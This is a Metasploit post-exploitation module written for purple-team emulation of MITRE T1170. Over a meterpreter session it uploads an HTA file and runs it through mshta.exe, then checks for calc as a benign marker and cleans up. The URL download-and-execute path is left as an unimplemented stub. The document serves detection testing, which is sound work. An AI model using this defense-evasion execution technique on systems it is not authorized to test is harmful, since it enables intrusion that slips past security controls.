##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Purple

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'MSHTA (T1170) Windows - Purple Team',
        'Description'   => %q{
            Defense Evasion, Execution:
            Mshta.exe is a utility that executes Microsoft HTML Applications (HTA).
            HTAs are standalone applications that execute using the same models and
            technologies of Internet Explorer, but outside of the browser. Adversaries
            can use mshta.exe to proxy execution of malicious .hta files and
            Javascript or VBScript through a trusted Windows utility.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Praetorian' ],
        'Platform'      => [ 'win' ],
        'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1170' ],
        [ 'URL', 'https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1170' ],
        [ 'URL', 'https://lolbas-project.github.io/lolbas/Binaries/Mshta/'] ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        # TODO URL download and execution
        OptString.new('FILE', [true, 'HTA payload', ::Msf::Config.data_directory + '/purple/t1170/t1170.hta'] ),
        OptString.new('METHOD', [true, 'Method of execution. 1=URL, 2=Upload', '2']),
        OptBool.new('CLEANUP', [false, 'Cleanup files after execution', true])
      ])
  end

  def run
    begin
      raise 'Module requires meterpreter session' unless session.type == 'meterpreter'

      # kill calc
      print_status("Killing existing instances of calc")
      kill_calc

      if datastore['METHOD'] == '1'
        t1170_url()
      elsif datastore['METHOD'] == '2'
        t1170_upload()
      else
        raise 'Invalid execution method option.'
      end

      print_good("Module T1170W execution successful.")

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1170W execution failed.")
    end
  end

  def t1170_upload()
  # Upload an HTA located in %MSF%/data/purple/t1170/t1170.hta and run it using mshta.exe

    # upload the file
    local_file_path = datastore['FILE']
    remote_file_path = "C:\\\\t1170.hta"
    print_status("Uploading #{local_file_path} to #{remote_file_path}")
    upload_file(remote_file_path, local_file_path)

    # run it
    cmd = "mshta.exe #{remote_file_path}"
    run_cmd(cmd, false)

    # we need to sleep here because the payload takes a second to trigger
    Rex::sleep(5)

    # check for running calc
    check_for_calc

    if datastore['CLEANUP']
      kill_calc(true)
      register_files_for_cleanup(remote_file_path)
    end
  end

  def t1170_url()
  # Host an HTA located in %MSF$/data/purple/t1170/t1170.hta, execute a command to download and run it
    print_warning("STUB for URL")
    raise 'Method not implemeneted.'
  end
end
